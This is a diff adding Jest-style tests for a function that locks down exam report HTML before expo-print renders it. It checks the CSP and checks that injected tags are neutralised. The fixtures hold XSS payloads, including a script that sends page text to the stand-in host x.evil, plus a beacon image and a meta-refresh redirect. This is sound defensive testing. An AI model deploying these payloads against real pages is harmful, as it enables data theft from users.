@@ -31,6 +31,7 @@ import {
   savedCopyWarningOf,
   sheetLabel,
   withExamCsp,
+  lockedPrintHtml,
 } from './examRoom';
 
 /** The lock a v2 frame document opens with, found and checked against the one built for it. */
@@ -697,5 +698,46 @@ describe('only our own scripts run (CUL-2531)', () => {
     expect(script).not.toMatch(/<\/?script|<!--|[\r\0]/i);
     // No handler attribute in the markup: it would never run under a hashed policy.
     expect(src.replace(script, '')).not.toMatch(/<[a-z][^>]*\son[a-z]+=/i);
+  });
+});
+
+describe('the report as expo-print receives it (CUL-2649)', () => {
+  // expo-print renders Share, Email and Print in its own WebView (iOS: script on, navigation open),
+  // outside every frame above. Owner text is escaped server-side; this is the second wall.
+  const INJECTED =
+    '<script>fetch("https://x.evil/?"+document.body.innerText)</script>' +
+    '<img src="https://x.evil/beacon.png"><link rel="preconnect" href="https://x.evil">' +
+    '<iframe srcdoc="<b>x</b>"></iframe><meta http-equiv="refresh" content="0;url=https://x.evil">';
+  const doc = `<!doctype html><html><head><title>Nyx</title></head><body><p>Oscar</p>${INJECTED}</body></html>`;
+
+  it('opens the head with the lock: the frame CSP (only the lock may run, no network), prefetch off, the lock', () => {
+    const out = lockedPrintHtml(doc);
+    const head = out.slice(out.indexOf('<head>') + '<head>'.length);
+    expect(head.startsWith(FRAME_LOCK_HEAD)).toBe(true);
+    // Only the lock's own hash: an injected <script> never selects the 'unsafe-inline' fallback.
+    expect(head).toContain(`content="${frameCsp([cspScriptHash(FRAME_LOCK_SCRIPT)])}"`);
+    expect(lockedPrintHtml(doc)).not.toContain("'unsafe-inline'; style");
+    expect(frameCsp([])).toMatch(/default-src 'none'.*img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'/);
+  });
+
+  it('renames every injected tag inert, so nothing in it runs, loads or navigates', () => {
+    const body = lockedPrintHtml(doc).split('<body>')[1];
+    expect(body).not.toMatch(/<\/?(script|link|iframe|meta)[\s>]/i);
+    expect(body).toContain('<x-refused-script>');
+    expect(body).toContain('<p>Oscar</p>');
+    // The one script left anywhere is the lock, in the head.
+    expect(lockedPrintHtml(doc).match(/<script>/g)).toHaveLength(1);
+    // <img> stays (the report's photos are data: images); the policy refuses any other source.
+    expect(lockedPrintHtml(doc)).toContain('img-src data:;');
+  });
+
+  it('a document with no head is boxed, never handed over unlocked', () => {
+    const bare = '<html>Nyx<script>alert(1)</script></html>';
+    expect(withFrameLock(bare)).toBeNull();
+    const out = lockedPrintHtml(bare);
+    expect(out.startsWith(FRAME_LOCK_HEAD)).toBe(true);
+    expect(out).not.toContain('<script>alert');
+    const typed = lockedPrintHtml('<!DOCTYPE html><body>Nyx</body>');
+    expect(typed.startsWith(`<!DOCTYPE html>${FRAME_LOCK_HEAD}`)).toBe(true);
   });
 });
